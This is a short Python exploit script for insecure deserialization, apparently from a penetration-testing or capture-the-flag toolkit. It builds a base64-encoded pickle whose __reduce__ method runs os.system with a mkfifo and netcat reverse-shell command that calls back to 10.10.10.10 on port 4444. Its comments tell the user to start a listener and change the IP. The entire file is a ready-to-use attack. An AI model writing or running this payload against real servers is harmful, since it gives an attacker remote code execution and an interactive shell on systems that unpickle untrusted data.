import pickle
import sys
import base64
"""
Insecure Deserialization - Code Execution
base64 RCE command 

Use this when a python server is executing an encoded payloaded make sure to have a netcat listener ready
nc -lvnp 4444

change your IP
"""
command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.10.10  4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
